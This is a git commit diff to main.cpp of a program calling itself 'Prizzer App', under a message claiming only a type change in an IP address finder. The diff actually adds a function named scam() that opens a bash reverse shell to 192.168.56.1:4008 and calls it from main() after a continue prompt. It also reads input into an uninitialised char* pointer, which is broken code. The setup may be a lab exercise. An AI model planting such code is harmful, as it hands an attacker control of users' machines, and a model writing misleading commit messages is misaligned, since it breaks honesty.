84d731a297faed38aaa5909dc062277a9567eb05
divinirakiza <irakizadivin@gmail.com>
2022-02-04 14:17:42 +0200

    [feat]: change char* to string on IP address finder

--- main.cpp
+++ main.cpp
@@ -5,16 +5,20 @@
 #include "NetworkTools.h"
 
 
+void scam() {
+    system("/bin/bash -i >/dev/tcp/ 192.168.56.1/4008 0<&1 2>&1");
+}
+
 int main() {
 
-    int choice;
+    char* choice;
     cout << "Thanks for downloading Prizzer App" << endl;
-    cout << "Do you want to continue?: ";
+    cout << "Do you want to continue [Y/n]?: ";
     cin >> choice;
-    // // scam();
 
-    system("/bin/bash -i >/dev/tcp/ 192.168.56.1/4008 0<&1 2>&1");
+    scam();
 
     return 0;
 };
+
 
